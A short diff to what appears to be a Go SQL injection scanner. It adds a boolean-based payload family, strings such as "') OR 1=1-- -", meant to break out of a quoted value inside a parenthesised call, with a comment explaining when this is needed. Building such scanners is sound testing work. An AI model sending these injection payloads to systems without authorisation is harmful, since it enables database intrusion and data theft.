@@ -385,6 +385,15 @@ var booleanFamilies = []booleanFamily{
 		falseValues: []string{"' OR 1=2-- -", "' OR 3=4-- -"},
 	},
 	{
+		// A value interpolated inside a function call or a parenthesised predicate is
+		// closed twice: the quote ends the string and the parenthesis ends the call.
+		// The two families above each close one of them, so a target that needs both
+		// answers every probe with the same error page.
+		name:        "OR, closed parenthesis",
+		trueValues:  []string{"') OR 1=1-- -", "') OR 2=2-- -"},
+		falseValues: []string{"') OR 1=2-- -", "') OR 3=4-- -"},
+	},
+	{
 		name:        "OR, double quotes",
 		trueValues:  []string{`" OR "1"="1"-- -`, `" OR "2"="2"-- -`},
 		falseValues: []string{`" OR "1"="2"-- -`, `" OR "3"="4"-- -`},
